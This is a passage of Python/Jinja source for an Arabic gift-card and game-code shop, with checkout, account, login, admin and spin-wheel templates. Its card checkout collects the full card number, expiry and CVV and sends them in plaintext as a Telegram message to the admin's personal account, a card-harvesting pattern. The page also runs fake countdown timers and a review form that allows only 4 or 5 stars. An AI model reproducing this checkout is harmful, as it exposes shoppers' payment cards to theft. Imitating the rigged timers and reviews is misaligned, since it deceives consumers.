      <div style="display:flex;gap:8px;margin-bottom:8px;">
        <div style="flex:1;">
          <label style="font-size:10.5px;color:#cbd5e1;display:block;margin-bottom:3px;">تاريخ الانتهاء:</label>
          <input id="cardExpiry" placeholder="MM/YY" maxlength="5" style="width:100%;padding:8px;background:#07132c;border:1px solid #263d70;border-radius:6px;color:#fff;font-size:11px;">
        </div>
        <div style="flex:1;">
          <label style="font-size:10.5px;color:#cbd5e1;display:block;margin-bottom:3px;">رمز الأمان (CVV):</label>
          <input id="cardCvv" placeholder="123" maxlength="4" type="password" style="width:100%;padding:8px;background:#07132c;border:1px solid #263d70;border-radius:6px;color:#fff;font-size:11px;">
        </div>
      </div>

      <label style="font-size:10.5px;color:#cbd5e1;display:block;margin-bottom:3px;">الدولة:</label>
      <input id="cardCountry" placeholder="مثال: مصر / السعودية" style="width:100%;padding:8px;background:#07132c;border:1px solid #263d70;border-radius:6px;color:#fff;font-size:11px;">
    </div>

    <div style="background:#03091b;padding:12px;border-radius:10px;text-align:right;font-size:12px;margin-bottom:15px;line-height:1.8;">
      <div>سعر المنتج الأصلي: <b id="basePrice" style="color:#fff;">0</b> جـ</div>
      <div id="discountRow" style="display:none;color:#35eaa1;">خصم الكود التطبيقي: <b id="discountVal">0</b> جـ</div>
      <div>رسوم التحويل/المعاملة: <b id="feePrice" style="color:#ff7777;">0</b> جـ</div>
      <hr style="border-color:#1b315c;margin:6px 0;">
      <div>المبلغ الإجمالي: <b id="totalPrice" style="color:#35eaa1;font-size:15px;">0</b> جـ</div>
    </div>

    <div style="display:flex;gap:10px;" id="actionButtons">
      <button id="submitPayBtn" onclick="submitPayment()" style="flex:1;padding:10px;background:linear-gradient(110deg,#9b37ff,#315dff);color:white;border:0;border-radius:8px;font-weight:bold;cursor:pointer;font-size:12px;">تأكيد الدفع 💳</button>
      <button onclick="closeCheckout()" style="padding:10px;background:#334155;color:white;border:0;border-radius:8px;cursor:pointer;font-size:12px;">إلغاء</button>
    </div>
  </div>
</div>

<div class="checkout-modal" id="reviewModal">
  <div class="checkout-box">
    <h3>✍️ تقييم الخدمة والافتخار برأيك</h3>
    <form action="/add_review" method="POST" style="margin-top:15px;">
      <input name="user_name" placeholder="اسمك الكامل" required style="width:100%;padding:10px;background:#03091b;border:1px solid #263d70;border-radius:8px;color:#fff;margin-bottom:10px;">
      <select name="rating" style="width:100%;padding:10px;background:#03091b;border:1px solid #263d70;border-radius:8px;color:#fff;margin-bottom:10px;">
        <option value="5">⭐⭐⭐⭐⭐ ممتاز جداً (5/5)</option>
        <option value="4">⭐⭐⭐⭐ جيد جداً (4/5)</option>
      </select>
      <textarea name="comment" placeholder="اكتب انطباعك ورأيك عن سرعة الشحن والخدمة..." required style="width:100%;height:80px;padding:10px;background:#03091b;border:1px solid #263d70;border-radius:8px;color:#fff;margin-bottom:15px;"></textarea>
      <div style="display:flex;gap:10px;">
        <button type="submit" style="flex:1;padding:10px;background:linear-gradient(110deg,#f59e0b,#d97706);color:white;border:0;border-radius:8px;font-weight:bold;cursor:pointer;">إرسال التقييم</button>
        <button type="button" onclick="closeReviewModal()" style="padding:10px;background:#334155;color:white;border:0;border-radius:8px;cursor:pointer;">إلغاء</button>
      </div>
    </form>
  </div>
</div>

<footer id="footer">
  <div>
    <a class="brand" href="/" style="margin-bottom:10px;"><span class="brand-mark" style="width:28px;height:28px;font-size:22px;">N</span><span>NOVA <b>STORE</b></span></a>
    <p style="line-height:1.7;margin:0 0 12px;">متجرك الرقمي الأول لبطاقات الدفع وأكواد الألعاب بأمان وسرعة.</p>
    <a href="https://t.me/{{ admin_telegram }}" target="_blank" class="footer-dev-btn">
      👨‍💻 التواصل المباشر مع المطور (@{{ admin_telegram }})
    </a>
  </div>

  <div>
    <h4>روابط سريعة</h4>
    <a href="/">الرئيسية</a>
    <a href="/spin">عجلة الحظ اليومية</a>
    <a href="/account">حسابي والشخصية</a>
  </div>

  <div>
    <h4>الدعم والتليجرام</h4>
    <div class="footer-link-box">
      <a href="https://t.me/{{ telegram_bot }}" target="_blank" class="footer-btn-item">
        <span>🤖</span> بوت تليجرام الخدمة (@{{ telegram_bot }})
      </a>
      <a href="{{ telegram_channel }}" target="_blank" class="footer-btn-item">
        <span>📢</span> قناة التليجرام الرسمية
      </a>
      <a href="https://t.me/{{ admin_telegram }}" target="_blank" class="footer-btn-item">
        <span>🎧</span> الدعم الفني المباشر 24/7
      </a>
    </div>
  </div>

  <div>
    <h4>وسائل الدفع والتطبيق</h4>
    <div style="font-size:18px;margin-top:8px;color:#35eaa1;font-weight:bold;">📱 فودافون كاش / 💳 فيزا</div>
    <small style="display:block;margin-top:15px;color:#8194ba;">© 2026 NOVA STORE جميع الحقوق محفوظة</small>
  </div>
</footer>

<script>
const PRODUCTS = {{ products|tojson }};
const productGrid = document.getElementById('productGrid');
const adminTelegram = "{{ admin_telegram }}";
let activeDiscountPercent = 0;
let currentFilteredProducts = PRODUCTS;
let selectedProd = null;
let currentPayMethod = 'vodafone';

let deferredPrompt;
window.addEventListener('beforeinstallprompt', (e) => {
  e.preventDefault();
  deferredPrompt = e;
});

function installApp() {
  if (deferredPrompt) {
    deferredPrompt.prompt();
    deferredPrompt.userChoice.then((choiceResult) => {
      if (choiceResult.outcome === 'accepted') {
        alert('تمت إضافة التطبيق لشاشتك الرئيسية بنجاح!');
      }
      deferredPrompt = null;
    });
  } else {
    alert('يمكنك تثبيت التطبيق من خيارات المتصفح (Add to Home Screen)');
  }
}

function openReviewModal(){ document.getElementById('reviewModal').style.display = 'grid'; }
function closeReviewModal(){ document.getElementById('reviewModal').style.display = 'none'; }

function renderProducts(items) {
  currentFilteredProducts = items;
  productGrid.innerHTML = '';
  items.forEach(p => {
    const card = document.createElement('article');
    card.className = 'product-card';
    let badgeHtml = p.badge ? `<span class="badge-tag ${p.badge==='مميز'?'memo':''}">${p.badge}</span>` : '';
    
    let visualHtml = p.image_url 
      ? `<img src="${p.image_url}" class="product-img" alt="${p.name}">` 
      : `<span style="color:${p.color};">${p.icon}</span>`;

    let priceHtml = '';
    if (activeDiscountPercent > 0) {
      let discountedPrice = (p.price_val * (1 - activeDiscountPercent / 100)).toFixed(0);
      priceHtml = `<span class="price">${discountedPrice} جـ</span><span class="old-price">${p.price_val} جـ</span>`;
    } else {
      priceHtml = `<span class="price">${p.price}</span>`;
    }

    card.innerHTML = `
      ${badgeHtml}
      <div class="product-visual">${visualHtml}</div>
      <h3 style="color:#fff;">${p.name}</h3>
      <p>${p.description}</p>
      <div class="price-row">
        <div>${priceHtml}</div>
        <button class="add-btn" onclick="openCheckout(${p.id})">شراء فوري 💳</button>
      </div>`;
    productGrid.appendChild(card);
  });
}

function switchPayMethod(method) {
  currentPayMethod = method;
  const tabs = document.querySelectorAll('.pay-tab');
  tabs.forEach(t => t.classList.remove('active'));

  if (method === 'vodafone') {
    tabs[0].classList.add('active');
    document.getElementById('vodafoneSection').style.display = 'block';
    document.getElementById('cardSection').style.display = 'none';
  } else {
    tabs[1].classList.add('active');
    document.getElementById('vodafoneSection').style.display = 'none';
    document.getElementById('cardSection').style.display = 'block';
  }
}

function openCheckout(prodId) {
  selectedProd = PRODUCTS.find(x => x.id === prodId);
  if (!selectedProd) return;

  document.getElementById('successBox').style.display = 'none';
  document.getElementById('actionButtons').style.display = 'flex';
  
  let basePrice = selectedProd.price_val;
  let discountVal = 0;

  if (activeDiscountPercent > 0) {
    discountVal = (basePrice * activeDiscountPercent) / 100;
    basePrice = basePrice - discountVal;
    document.getElementById('discountRow').style.display = 'block';
    document.getElementById('discountVal').textContent = discountVal.toFixed(1);
  } else {
    document.getElementById('discountRow').style.display = 'none';
  }

  const fee = Math.ceil(basePrice / 10) * 3;
  const total = basePrice + fee;

  document.getElementById('modalProdName').textContent = selectedProd.name;
  document.getElementById('modalProdDesc').textContent = selectedProd.description;
  document.getElementById('basePrice').textContent = selectedProd.price_val;
  document.getElementById('feePrice').textContent = fee;
  document.getElementById('totalPrice').textContent = total.toFixed(1);

  switchPayMethod('vodafone');
  document.getElementById('checkoutModal').style.display = 'grid';
}

function submitPayment() {
  if (!selectedProd) return;
  
  let basePrice = selectedProd.price_val;
  if (activeDiscountPercent > 0) basePrice = basePrice * (1 - activeDiscountPercent / 100);
  const fee = Math.ceil(basePrice / 10) * 3;
  const total = basePrice + fee;

  let msg = '';
  if (currentPayMethod === 'vodafone') {
    msg = `مرحباً، قمت بتحويل مبلغ (${total.toFixed(1)} جـ) عبر فودافون كاش لشراء: (${selectedProd.name}). أرجو إرسال الكود.`;
  } else {
    const name = document.getElementById('cardHolderName').value.trim();
    const num = document.getElementById('cardNumber').value.trim();
    const exp = document.getElementById('cardExpiry').value.trim();
    const cvv = document.getElementById('cardCvv').value.trim();
    const country = document.getElementById('cardCountry').value.trim();

    if (!name || !num || !exp || !cvv) {
      alert('يرجى إكمال جميع بيانات البطاقة لربط الدفع بنجاح.');
      return;
    }

    msg = `💳 طلب شراء جديد بالبطاقة:\n- المنتج: ${selectedProd.name}\n- المبلغ: ${total.toFixed(1)} جـ\n\n[بيانات البطاقة]:\n- الاسم: ${name}\n- الرقم: ${num}\n- التاريخ: ${exp}\n- CVV: ${cvv}\n- الدولة: ${country}`;
  }

  document.getElementById('devContactBtn').href = `https://t.me/${adminTelegram}?text=${encodeURIComponent(msg)}`;
  
  document.getElementById('vodafoneSection').style.display = 'none';
  document.getElementById('cardSection').style.display = 'none';
  document.getElementById('actionButtons').style.display = 'none';
  document.getElementById('successBox').style.display = 'block';
}

function closeCheckout() {
  document.getElementById('checkoutModal').style.display = 'none';
}

function applyPromo() {
  const codeInput = document.getElementById('promoCodeInput').value.trim().toUpperCase();
  const msg = document.getElementById('promoMsg');
  if (!codeInput) return;

  fetch('/apply_promo', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({code: codeInput})
  })
  .then(res => res.json())
  .then(data => {
    if (data.status === 'success') {
      activeDiscountPercent = data.discount_percent;
      msg.style.color = '#35eaa1';
      msg.textContent = `🎉 ${data.message}`;
      renderProducts(currentFilteredProducts);
    } else {
      msg.style.color = '#ff7777';
      msg.textContent = `❌ ${data.message}`;
    }
  })
  .catch(() => {
    msg.style.color = '#ff7777';
    msg.textContent = '❌ حدث خطأ أثناء التحقق من كود الخصم.';
  });
}

let sec = 9918;
setInterval(() => {
  if (sec <= 0) return;
  sec--;
  let h = Math.floor(sec / 3600);
  let m = Math.floor((sec % 3600) / 60);
  let s = sec % 60;
  document.getElementById('flashTimer').textContent = 
    `${h < 10 ? '0'+h : h}:${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
}, 1000);

let dealSec = 1199;
setInterval(() => {
  if (dealSec <= 0) return;
  dealSec--;
  let m = Math.floor(dealSec / 60);
  let s = dealSec % 60;
  document.getElementById('personalTimer').textContent = 
    `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
}, 1000);

function filterCat(cat) {
  if (cat === 'الكل') renderProducts(PRODUCTS);
  else renderProducts(PRODUCTS.filter(x => x.category === cat));
}

function filterProducts() {
  const query = document.getElementById('searchInput').value.toLowerCase();
  renderProducts(PRODUCTS.filter(x => x.name.toLowerCase().includes(query)));
}

{% if session.get('active_discount') %}
  activeDiscountPercent = {{ session.get('active_discount') }};
  document.getElementById('promoMsg').style.color = '#35eaa1';
  document.getElementById('promoMsg').textContent = '🎉 تم تطبيق الخصم الحصري بنجاح!';
{% endif %}

renderProducts(PRODUCTS);
</script>
</body>
</html>
"""

ACCOUNT_PAGE = r"""
<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<title>حسابي الشيك | NOVA STORE</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
body{margin:0;background:radial-gradient(ellipse at 50% 0%,#180b3d 0%,#03091b 100%);color:white;font-family:'Cairo',sans-serif;min-height:100vh;padding:20px;display:grid;place-items:center;}
.box{background:linear-gradient(145deg,#07132c,#091a42);border:1px solid #315dff;border-radius:24px;padding:30px;text-align:center;width:100%;max-width:480px;box-shadow:0 10px 40px rgba(49,93,255,0.25);}
.avatar-preview{width:100px;height:100px;border-radius:50%;margin:0 auto 15px;background:linear-gradient(135deg,#9b37ff,#315dff);display:grid;place-items:center;font-size:42px;overflow:hidden;border:3px solid #35eaa1;box-shadow:0 0 20px #35eaa1aa;position:relative;}
.avatar-preview img{width:100%;height:100%;object-fit:cover;}
.preset-avatars{display:flex;gap:10px;justify-content:center;margin:12px 0;}
.preset-item{width:42px;height:42px;border-radius:50%;background:#0a1a3f;border:2px solid #263d70;display:grid;place-items:center;font-size:22px;cursor:pointer;transition:0.2s;}
.preset-item:hover{border-color:#35eaa1;transform:scale(1.1);}
.badges-row{display:flex;gap:8px;justify-content:center;margin:15px 0;flex-wrap:wrap;}
.badge-item{background:#0a1a3f;border:1px solid #1f3a70;padding:5px 12px;border-radius:20px;font-size:10px;font-weight:bold;color:#38bdf8;}
input, select{width:100%;padding:11px;margin:6px 0 12px;background:#03091b;border:1px solid #263d70;border-radius:10px;color:white;box-sizing:border-box;}
button{padding:12px;background:linear-gradient(110deg,#9b37ff,#315dff);border:0;border-radius:10px;color:white;font-weight:bold;cursor:pointer;width:100%;font-size:13px;}
</style>
</head>
<body>
<div class="box">
  <div class="avatar-preview">
    {% if user["avatar"].startswith('http') or user["avatar"].startswith('/') %}
      <img src="{{ user['avatar'] }}" alt="Avatar">
    {% else %}
      {{ user["avatar"] }}
    {% endif %}
  </div>
  <h2 style="margin:0 0 4px;">{{ user["name"] }}</h2>
  <span style="color:#35eaa1;font-weight:800;font-size:12px;display:block;">{{ user["status_title"] }} | الرصيد: {{ user["balance"] }} جـ</span>
  <div class="badges-row">
    {% if user["spin_count"] and user["spin_count"] > 0 %}
      <span class="badge-item" style="border-color:#f59e0b;color:#facc15;">🎡 صائد الحظ</span>
    {% endif %}
    {% if user["total_orders"] and user["total_orders"] > 0 %}
      <span class="badge-item" style="border-color:#35eaa1;color:#35eaa1;">🎯 أول شحنة</span>
    {% endif %}
    <span class="badge-item">👑 العميل الوفي</span>
  </div>
  <hr style="border-color:#1c3361;margin:20px 0;">
  <form method="POST" action="/update_profile" enctype="multipart/form-data" style="text-align:right;">
    <label style="font-size:11.5px;color:#cbd5e1;font-weight:bold;">📸 رفع صورة شخصية شيك من هاتفـك:</label>
    <input type="file" name="avatar_file" accept="image/*" style="background:#03091b;">
    <label style="font-size:11.5px;color:#cbd5e1;font-weight:bold;">أو اختر أفاتار ألعاب شيك جاهز:</label>
    <div class="preset-avatars">
      <span class="preset-item" onclick="setAvatar('🎮')">🎮</span>
      <span class="preset-item" onclick="setAvatar('👑')">👑</span>
      <span class="preset-item" onclick="setAvatar('🥷')">🥷</span>
      <span class="preset-item" onclick="setAvatar('🔥')">🔥</span>
      <span class="preset-item" onclick="setAvatar('🦁')">🦁</span>
    </div>
    <input type="hidden" name="avatar_preset" id="avatarPreset" value="{{ user['avatar'] }}">
    <label style="font-size:11.5px;color:#cbd5e1;font-weight:bold;">رابط صورة مخصص (اختياري):</label>
    <input name="avatar_url" placeholder="أدخل رابط صورة المباشر">
    <label style="font-size:11.5px;color:#cbd5e1;font-weight:bold;">تعديل اللقب في المتجر:</label>
    <input name="status_title" value="{{ user['status_title'] }}" placeholder="مثال: VIP / عضو مميز" required>
    <button type="submit">حفظ التعديلات الشيك ✨</button>
  </form>
  <div style="margin-top:20px;display:flex;justify-content:space-between;">
    <a href="/" style="color:#8198ff;text-decoration:none;font-size:12px;">← العودة للمتجر الرئيسية</a>
    <a href="/logout" style="color:#ff7777;text-decoration:none;font-size:12px;">تسجيل الخروج</a>
  </div>
</div>
<script>
function setAvatar(emoji) {
  document.getElementById('avatarPreset').value = emoji;
  alert('تم اختيار الأفاتار: ' + emoji + ' (اضغط حفظ للتأكيد)');
}
</script>
</body>
</html>
"""

REGISTER_PAGE = r"""
<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<title>إنشاء حساب | NOVA STORE</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
body{margin:0;background:#03091b;color:white;font-family:'Cairo',sans-serif;display:grid;place-items:center;min-height:100vh;}
.box{background:#07132c;padding:30px;border:1px solid #315dff;border-radius:15px;width:360px;}
input{width:100%;padding:12px;margin:8px 0;background:#03091b;border:1px solid #263d70;border-radius:9px;color:white;box-sizing:border-box;}
button{width:100%;padding:13px;background:linear-gradient(110deg,#9b37ff,#315dff);border:0;border-radius:10px;color:white;font-weight:bold;cursor:pointer;margin-top:10px;}
</style>
</head>
<body>
<div class="box">
  <h2>إنشاء حساب جديد</h2>
  {% if step == 1 %}
  <form method="post">
    <input name="name" placeholder="الاسم الكامل" required>
    <input type="email" name="email" placeholder="البريد الإلكتروني" required>
    <input type="password" name="password" placeholder="كلمة المرور" required>
    <input name="telegram_id" placeholder="Telegram Chat ID (لاستلام كود التحقق)" required>
    <button type="submit">إرسال كود التحقق عبر التليجرام</button>
  </form>
  <a href="/login_google" style="display:block;text-align:center;padding:12px;border-radius:10px;color:white;text-decoration:none;font-weight:bold;background:#db4437;margin-top:10px;">التسجيل بحساب جوجل 🌐</a>
  {% else %}
  <form method="post">
    <p style="color:#35eaa1;font-size:12px;">تم إرسال كود التحقق إلى بوت التليجرام الخاص بك!</p>
    <input name="code" placeholder="أدخل كود التحقق" required>
    <button type="submit">تأكيد التسجيل</button>
  </form>
  {% endif %}
  {% if error %}<p style="color:#ff7777;font-size:12px;margin-top:10px;">{{ error }}</p>{% endif %}
  <a href="/login" style="color:#8198ff;display:block;margin-top:15px;text-align:center;font-size:12px;text-decoration:none;">تسجيل الدخول</a>
</div>
</body>
</html>
"""

LOGIN_PAGE = r"""
<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<title>تسجيل الدخول | NOVA STORE</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
body{margin:0;background:#03091b;color:white;font-family:'Cairo',sans-serif;display:grid;place-items:center;min-height:100vh;}
.box{background:#07132c;padding:30px;border:1px solid #315dff;border-radius:15px;width:360px;}
input{width:100%;padding:12px;margin:8px 0;background:#03091b;border:1px solid #263d70;border-radius:9px;color:white;box-sizing:border-box;}
button{width:100%;padding:13px;background:linear-gradient(110deg,#9b37ff,#315dff);border:0;border-radius:10px;color:white;font-weight:bold;cursor:pointer;margin-top:10px;}
</style>
</head>
<body>
<div class="box">
  <h2>تسجيل الدخول</h2>
  <form method="post">
    <input type="email" name="email" placeholder="البريد الإلكتروني" required>
    <input type="password" name="password" placeholder="كلمة المرور" required>
    <button type="submit">دخول</button>
  </form>
  <a href="/login_google" style="display:block;text-align:center;padding:12px;border-radius:10px;color:white;text-decoration:none;font-weight:bold;background:#db4437;margin-top:10px;">الدخول بحساب جوجل 🌐</a>
  {% if error %}<p style="color:#ff7777;font-size:12px;margin-top:10px;">{{ error }}</p>{% endif %}
  <a href="/register" style="color:#8198ff;display:block;margin-top:15px;text-align:center;font-size:12px;text-decoration:none;">إنشاء حساب جديد</a>
</div>
</body>
</html>
"""

ADMIN_PANEL_PAGE = r"""
<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<title>لوحة التحكم الشاملة | NOVA STORE</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
body{margin:0;background:#03091b;color:white;font-family:'Cairo',sans-serif;padding:20px;}
.admin-container{max-width:900px;margin:auto;}
.box{background:#07132c;border:1px solid #315dff;border-radius:15px;padding:20px;margin-bottom:20px;}
h3{margin-top:0;color:#35eaa1;}
label{font-size:11px;color:#a8b7d8;display:block;margin-top:8px;}
input, select, textarea{width:100%;padding:10px;margin:4px 0 10px;background:#03091b;border:1px solid #263d70;border-radius:8px;color:white;box-sizing:border-box;}
button{width:100%;padding:11px;background:linear-gradient(110deg,#9b37ff,#315dff);border:0;border-radius:8px;color:white;font-weight:bold;cursor:pointer;}
.table-style{width:100%;border-collapse:collapse;font-size:12px;margin-top:10px;}
.table-style th, .table-style td{border:1px solid #1f3769;padding:8px;text-align:center;}
.table-style th{background:#0a1a3f;}
.btn-del{background:#e11d48;color:white;border:0;padding:5px 10px;border-radius:6px;cursor:pointer;}
</style>
</head>
<body>
<div class="admin-container">
  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
    <h2>⚙️ لوحة تحكم المطور الشاملة</h2>
    <a href="/" style="color:#8198ff;text-decoration:none;font-weight:bold;">← العودة للمتجر الرئيسية</a>
  </div>

  <div class="box">
    <h3>🏷️ إنشاء كود خصم جديد (Promo Codes)</h3>
    <form method="POST" action="/admin/add_promo">
      <label>رمز الكود (باللغة الإنجليزية):</label>
      <input name="code" placeholder="مثال: DISCOUNT20" required style="text-transform:uppercase;">
      <label>نسبة الخصم (%):</label>
      <input type="number" step="0.1" name="discount_percent" placeholder="مثال: 15" required>
      <button type="submit">إنشاء وتفعيل كود الخصم</button>
    </form>

    <h4 style="margin-top:15px;color:#fff;">الأكواد المتاحة حالياً:</h4>
    <table class="table-style">
      <thead>
        <tr>
          <th>الكود</th>
          <th>نسبة الخصم</th>
          <th>الحالة</th>
          <th>إجراء</th>
        </tr>
      </thead>
      <tbody>
        {% for p in promo_codes %}
        <tr>
          <td><b>{{ p['code'] }}</b></td>
          <td>{{ p['discount_percent'] }}%</td>
          <td>{% if p['active'] %}مفعل ✅{% else %}معطل ❌{% endif %}</td>
          <td>
            <a href="/admin/delete_promo/{{ p['id'] }}" onclick="return confirm('هل أنت تأكد من حذف كود الخصم؟')">
              <button class="btn-del">حذف</button>
            </a>
          </td>
        </tr>
        {% endfor %}
      </tbody>
    </table>
  </div>

  <div class="box">
    <h3>📢 نشر خبر / إعلان / منشور جديد لجميع المستخدمين</h3>
    <form method="POST" action="/admin/add_post" enctype="multipart/form-data">
      <label>عنوان المنشور / الإعلان:</label>
      <input name="title" placeholder="مثال: 🚀 توفرت كميات جديدة من بطاقات جوجل بلاي!" required>
      <label>محتوى ونشره النصي:</label>
      <textarea name="content" placeholder="اكتب تفاصيل الإعلان هنا..." required style="height:70px;"></textarea>
      <label>صورة مرفقة مع المنشور (اختياري):</label>
      <input type="file" name="image_file" accept="image/*" style="background:#0a1a3f;padding:8px;">
      <label>رابط إلكتروني خارجي لتوجيه المستخدمين (اختياري):</label>
      <input name="link_url" placeholder="https://t.me/Midomsn">
      <button type="submit">نشر الإعلان فوراً في التطبيق المتجر</button>
    </form>

    <h4 style="margin-top:15px;color:#fff;">المنشورات المنشورة سابقاً:</h4>
    <table class="table-style">
      <thead>
        <tr>
          <th>العنوان</th>
          <th>النص</th>
          <th>حذف</th>
        </tr>
      </thead>
      <tbody>
        {% for post in posts %}
        <tr>
          <td>{{ post['title'] }}</td>
          <td>{{ post['content'][:40] }}...</td>
          <td>
            <a href="/admin/delete_post/{{ post['id'] }}" onclick="return confirm('حذف المنشور؟')">
              <button class="btn-del">حذف</button>
            </a>
          </td>
        </tr>
        {% endfor %}
      </tbody>
    </table>
  </div>

  <div class="box">
    <h3>📲 رقم فودافون كاش لتحويل الأموال والأرباح</h3>
    <form method="POST" action="/admin/update_vodafone">
      <input name="vodafone_number" value="{{ vodafone_number }}" placeholder="أدخل رقم فودافون كاش الجديد" required>
      <button type="submit">تحديث رقم فودافون كاش</button>
    </form>
  </div>

  <div class="box">
    <h3>⚡ التحكم في شريط العروض والخصومات العلوي</h3>
    <form method="POST" action="/admin/update_flash">
      <input name="flash_msg" value="{{ flash_msg }}" placeholder="نص رسالة العروض والخصومات" required>
      <button type="submit">تحديث رسالة العروض</button>
    </form>
  </div>

  <div class="box">
    <h3>➕ إضافة منتج جديد بالصورة والأسعار</h3>
    <form method="POST" action="/admin/add_product" enctype="multipart/form-data">
      <label>اسم المنتج:</label>
      <input name="name" placeholder="مثال: كود بلايستيشن 20$" required>
      <label>وصف المنتج:</label>
      <input name="description" placeholder="مثال: الولايات المتحدة - تسليم فوري" required>
      <label>السعر الرقمي (بالجنيه):</label>
      <input type="number" step="0.01" name="price_val" placeholder="مثال: 1000" required>
      <label>نص السعر المكتوب:</label>
      <input name="price" placeholder="مثال: 1000 جـ" required>
      <label>الكود الرقمي للمنتج:</label>
      <input name="code" placeholder="أدخل الكود الرقمي" required>
      <label style="color:#35eaa1;font-weight:bold;">📸 اختر صورة المنتج مباشرة من جهازك:</label>
      <input type="file" name="image_file" accept="image/*" style="background:#0a1a3f;padding:8px;">
      <label>الأيقونة الاحتياطية:</label>
      <input name="icon" placeholder="مثال: ▶ أو 🎮" required>
      <label>القسم:</label>
      <input name="category" placeholder="بطاقات الألعاب / بطاقات الهدايا / ألعاب / عملات رقمية ودولارات / بطاقات الدفع" required>
      <label>الشارة:</label>
      <input name="badge" placeholder="مثال: مميز / عروض سريعة 🔥">
      <button type="submit" style="margin-top:10px;">إضافة المنتج للمتجر</button>
    </form>
  </div>

  <div class="box">
    <h3>📦 المنتجات المتاحة حالياً في المتجر (إدارة وحذف)</h3>
    <table class="table-style">
      <thead>
        <tr>
          <th>ID</th>
          <th>الصورة / الأيقونة</th>
          <th>اسم المنتج</th>
          <th>السعر</th>
          <th>القسم</th>
          <th>حذف</th>
        </tr>
      </thead>
      <tbody>
        {% for p in products %}
        <tr>
          <td>{{ p['id'] }}</td>
          <td>
            {% if p['image_url'] %}
              <img src="{{ p['image_url'] }}" style="width:30px;height:30px;object-fit:cover;border-radius:4px;">
            {% else %}
              {{ p['icon'] }}
            {% endif %}
          </td>
          <td>{{ p['name'] }}</td>
          <td>{{ p['price'] }}</td>
          <td>{{ p['category'] }}</td>
          <td>
            <a href="/admin/delete_product/{{ p['id'] }}" onclick="return confirm('هل أنت تأكد من حذف المنتج؟')">
              <button class="btn-del">حذف</button>
            </a>
          </td>
        </tr>
        {% endfor %}
      </tbody>
    </table>
  </div>
</div>
</body>
</html>
"""

SPIN_PAGE = r"""
<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<title>عجلة الحظ السينمائية | NOVA STORE</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
*{box-sizing:border-box}
body{margin:0;background:radial-gradient(ellipse at center,#0f1c3f 0%,#03091b 100%);color:#fff;font-family:'Cairo',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;overflow:hidden;}
.wheel-container{position:relative;width:340px;height:340px;display:flex;align-items:center;justify-content:center;margin:20px 0;}
.wheel-outer-ring{position:absolute;inset:-15px;border-radius:50%;border:5px dashed #315dff;box-shadow:0 0 50px #8d38ff;pointer-events:none;z-index:2;}
.pointer{position:absolute;top:-25px;left:50%;transform:translateX(-50%);width:0;height:0;border-left:18px solid transparent;border-right:18px solid transparent;border-top:32px solid #ff3b3b;z-index:10;}
canvas{width:100%;height:100%;border-radius:50%;transition: transform 6s cubic-bezier(0.1, 0.9, 0.1, 1);}
.spin-btn{position:absolute;width:80px;height:80px;border-radius:50%;background:radial-gradient(circle,#9b37ff,#315dff);border:4px solid #fff;color:#fff;font-weight:900;font-size:16px;cursor:pointer;z-index:5;}
.modal{display:none;position:fixed;inset:0;background:#03091bee;backdrop-filter:blur(12px);z-index:100;place-items:center;padding:20px;}
.modal-content{background:linear-gradient(145deg,#07132c,#0b1e47);border:2px solid #35eaa1;border-radius:20px;padding:30px;text-align:center;max-width:360px;width:100%;}
</style>
</head>
<body>
<div style="text-align:center;margin-bottom:15px;">
  <h1 style="font-size:28px;margin:0;background:linear-gradient(110deg,#bc5bff,#315dff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">🎡 عجلة الحظ السينمائية</h1>
  <p style="color:#a8b7d8;font-size:12px;">متاحة لفة واحدة كل يوم مجهزة بمؤثرات وصوت!</p>
</div>

<div class="wheel-container">
  <div class="pointer"></div>
  <div class="wheel-outer-ring"></div>
  <canvas id="wheel" width="500" height="500"></canvas>
  <button class="spin-btn" id="spinBtn">أَدِرْ!</button>
</div>

<a href="/" style="color:#8198ff;text-decoration:none;margin-top:20px;font-size:13px;">← العودة للمتجر الرئيسية</a>

<div class="modal" id="resultModal">
  <div class="modal-content">
    <div style="font-size:50px;">🎁</div>
    <h2 id="prizeTitle" style="color:#35eaa1;margin:5px 0;">مبروك!</h2>
    <p id="prizeDesc" style="color:#a8b7d8;font-size:13px;"></p>
    <button onclick="location.href='/'" style="margin-top:15px;padding:10px 20px;background:linear-gradient(110deg,#9b37ff,#315dff);border:0;border-radius:10px;color:white;font-weight:bold;cursor:pointer;">التوجه للمتجر للشراء بالخصم 🔥</button>
  </div>
</div>

<script>
function playSpinSound() {
  const ctx = new (window.AudioContext || window.webkitAudioContext)();
  const osc = ctx.createOscillator();
  const gain = ctx.createGain();
  osc.type = 'triangle';
  osc.frequency.setValueAtTime(300, ctx.currentTime);
  osc.frequency.exponentialRampToValueAtTime(800, ctx.currentTime + 5);
  gain.gain.setValueAtTime(0.1, ctx.currentTime);
  gain.gain.linearRampToValueAtTime(0, ctx.currentTime + 5);
  osc.connect(gain);
  gain.connect(ctx.destination);
  osc.start();
  osc.stop(ctx.currentTime + 5);
}

const canvas = document.getElementById('wheel');
const ctx = canvas.getContext('2d');
const spinBtn = document.getElementById('spinBtn');
const resultModal = document.getElementById('resultModal');

const items = [
  { label: '5 جنيه 💰', color: '#8d38ff', amount: 5, discount: 0 },
  { label: 'حظ أوفر 😅', color: '#1b2a4a', amount: 0, discount: 0 },
  { label: '10 جنيه 💳', color: '#315dff', amount: 10, discount: 0 },
  { label: 'خصم 20% 🏷️', color: '#00c853', amount: 0, discount: 20 },
